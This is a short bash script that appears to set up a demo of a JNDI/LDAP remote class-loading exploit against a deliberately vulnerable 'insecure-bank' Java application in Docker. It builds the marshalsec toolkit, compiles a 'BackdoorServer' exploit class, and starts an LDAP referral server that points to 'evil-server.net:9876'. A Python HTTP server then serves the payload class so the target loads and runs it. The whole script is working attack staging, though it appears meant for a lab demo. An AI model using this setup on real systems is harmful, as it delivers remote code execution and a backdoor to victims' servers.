#!/bin/bash

# note: this script does not care for correctly terminating all processes and was created for usage in docker containers

# add "evil-server.net" to /etc/hosts for cooler demo flow
#echo "127.0.0.1       evil-server.net" >> /etc/hosts

mvn clean package

# build marshalsec
cd marshalsec
mvn clean install
cd ..

# build exploit
javac exploits/BackdoorServer.java

# run LDAP servers, 1 instance for each exploit
cd marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://evil-server.net:9876/#BackdoorServer" 1389 &> ../ldap_server1.log &
#java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://evil-server.net:9876/#BackdoorServerV2" 1390 &> ../ldap_server2.log &
cd ..

# run HTTP server for serving exploits
cd exploits
python3 -m http.server --bind 0.0.0.0 9876 &> ../http_server.log &
cd ..

# run insecure-bank application
mvn cargo:run &
